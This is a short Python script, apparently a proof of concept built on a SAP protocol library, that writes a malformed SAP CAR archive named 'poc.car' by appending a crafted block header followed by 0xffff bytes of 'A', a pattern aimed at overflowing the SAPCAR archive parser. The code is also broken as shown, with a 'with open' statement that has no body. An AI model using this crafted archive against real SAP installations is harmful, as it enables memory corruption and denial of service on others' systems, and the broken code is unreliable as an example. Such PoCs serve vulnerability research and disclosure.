# We write a file just to have some data to put into the archive
with open("string.txt", "w") as fd:
  
# Create a new SAP CAR Archive
f = SAPCARArchive("poc.car", mode="wb", version=SAPCAR_VERSION_200)
# Add the text file
f.add_file("string.txt")
  
f._sapcar.files0[0].blocks.append(Raw("D>" + "\x00"*30 + "\x00\xff"))
f._sapcar.files0[0].blocks.append(Raw("A" * 0xffff))
  
# Write the file
f.write()
